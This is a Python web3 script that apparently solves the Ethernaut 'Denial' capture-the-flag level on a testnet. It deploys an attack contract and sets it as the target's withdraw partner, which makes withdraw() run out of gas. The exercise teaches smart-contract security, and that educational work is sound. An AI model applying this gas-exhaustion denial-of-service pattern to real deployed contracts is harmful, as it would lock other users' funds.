import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to the provider!")
else:
    print("Failed to connect to the given provider ", os.getenv('PROVIDER_URL'))
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
_WALLET = w3.to_checksum_address(os.getenv('WALLET'))


def send_transaction_and_wait(transaction):
    transaction = transaction.build_transaction({
        'from': _WALLET,
        'chainId': 11155111,
        'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET))
    })
    signed_tx = w3.eth.account.sign_transaction(transaction, private_key=_PRIVATE_KEY)

    txn_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
    assert tx_receipt['status'] == 1
    print(f'Completed transaction: {tx_receipt}')
    return tx_receipt


def compile_contract(contract_path: str, version: str, contract_name: str = None):
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()

    compiled_sol = solcx.compile_source(contract_source)
    if contract_name is None:
        contract_key = next(iter(compiled_sol))
    else:
        contract_key = f'<stdin>:{contract_name}'
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface

# Step 1: Load Ethernaut deployed contract
deployed_address = w3.to_checksum_address("")
compiled_contract = compile_contract("./Denial.sol", '0.8.0')
denial_contract = w3.eth.contract(address=deployed_address, abi=compiled_contract['abi'])

# Step 2: Deploy our attack contract
compiled_contract = compile_contract("./DenialAttack.sol", '0.8.0')
attack_contract = w3.eth.contract(abi=compiled_contract['abi'], bytecode=compiled_contract['bin'])
receipt = send_transaction_and_wait(attack_contract.constructor())
attack_contract_address = receipt["contractAddress"]

# Step 3: become a withdrawing partner and call withdraw.
receipt = send_transaction_and_wait(denial_contract.functions.setWithdrawPartner(attack_contract_address))
assert attack_contract_address == denial_contract.functions.partner().call()
print('You became the partner now')

# withdraw should run infinitely and result in web3.exceptions.TimeExhausted: Transaction HexBytes('') ...
# send_transaction_and_wait(denial_contract.functions.withdraw())
print('Well done, You have completed this level!!!')
